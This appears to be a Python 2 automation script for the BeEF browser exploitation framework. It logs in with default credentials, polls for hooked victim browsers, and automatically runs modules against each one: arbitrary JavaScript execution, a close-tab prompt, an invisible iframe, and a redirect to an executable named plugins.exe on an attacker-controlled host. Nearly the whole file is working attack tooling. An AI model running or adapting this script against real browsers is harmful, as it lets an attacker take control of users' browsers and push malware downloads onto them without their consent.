#!/usr/bin/env python
# -*- coding: utf-8 -*-
# ** Author: ssooking


import json
import urllib2
import time


hostlist = []
hostdict = {}

def getauthkey(host):
    apiurl =  host + "api/admin/login"
    logindata = {
        "username":"beef",
        "password":"beef"
    }
    jdata = json.dumps(logindata)             # 对数据进行JSON格式化编码
    req = urllib2.Request(apiurl, jdata)      # 生成页面请求的完整数据
    response = urllib2.urlopen(req)           # 发送页面请求
    resdata = response.read()                 # 获取服务器返回的页面信息，数据类型为str
    jsondata =  json.loads(resdata)	      	  # 把数据解析成python对象，此时返回dict数据
    return jsondata['token']

def getHookedBrowsersSession(host,authkey):
    f = urllib2.urlopen(host + "/api/hooks?token=" + authkey)
    data = json.loads(f.read())
    hookonline = data['hooked-browsers']['online']
    for x in hookonline:
        hookid = hookonline[x]['id']
        hookip = hookonline[x]['ip']
        hooksession = hookonline[x]['session']
        if hookid not in hostdict:
            hostdict[hookid] = hooksession
            print "\n[+] Hooked host id:  " + bytes(hookid) + "\n   >>> IP: " + bytes(hookip) + "\n   >>> Session: " + hooksession

def sendConfirm(host, session, authkey):
    postdata = '{}'
    url = host + "api/modules/" + session + "/177?token=" + authkey
    #print url
    req = urllib2.Request(url, postdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    f = urllib2.urlopen(req)
    print "   >>> [+] Module Confirm Close Tab has been Executed ! "
    return f.read()

def execJavascript(host, session, authkey):

    payload={
        "cmd":"alert('Hello by ssooking!');"
    }
    apiurl = host + "api/modules/" + session + "/169?token=" + authkey
    jdata = json.dumps(payload)
    req = urllib2.Request(apiurl, jdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    response = urllib2.urlopen(req)
    resdata = response.read()
    print "   >>> [+] Module Raw JavaScript has been Executed ! "
    return resdata

def redirectBrowser(host, session, authkey):
    payload = {"redirect_url":"http://192.168.1.133:8000/plugins.exe"}
    apiurl = host + "api/modules/" + session + "/42?token=" + authkey
    jdata = json.dumps(payload)
    req = urllib2.Request(apiurl, jdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    response = urllib2.urlopen(req)
    resdata = response.read()
    jsondata =  json.loads(resdata)
    print "   >>> [+] Module Redirect Browser has been Executed ! "
    return jsondata

def createIFrame(host, sessionId, authkey):
    postdata = '{"target":"http://192.168.1.133:8000/"}'
    url = host + "api/modules/" + sessionId + "/174?token=" + authkey
    req = urllib2.Request(url, postdata)
    req.add_header("Content-Type", "application/json; charset=UTF-8")
    f = urllib2.urlopen(req)
    print "   >>> [+] Module Create Invisible Iframe has been Executed ! "
    return f.read()


def autoRunModules(host,session,authkey):
    sendConfirm(host, session, authkey)
    execJavascript(host, session, authkey)
    #redirectBrowser(host, session, authkey)


def timeRun(interval,host):
    authkey = getauthkey(host)
    print "[+] AutoBeef is running...."
    print "[+] BeEF KEY is : "+ authkey
    print "[+] Base BeEF API URL: "+ host + "api/"
    print "[+] Hook URL   : " + host + "hook.js"
    print "[+] Hook Demo  : " + host + "demos/basic.html"
    while True:
        try:
            getHookedBrowsersSession(host, authkey)
            for x in hostdict:
                if hostdict[x] not in hostlist:
                    hostlist.append(hostdict[x])
                    autoRunModules(host,hostdict[x],authkey)
            time.sleep(interval)
        except Exception, e:
            print e

if __name__ == '__main__':
    beefhost = "http://192.168.1.133:3000/"
    timeRun(3,beefhost)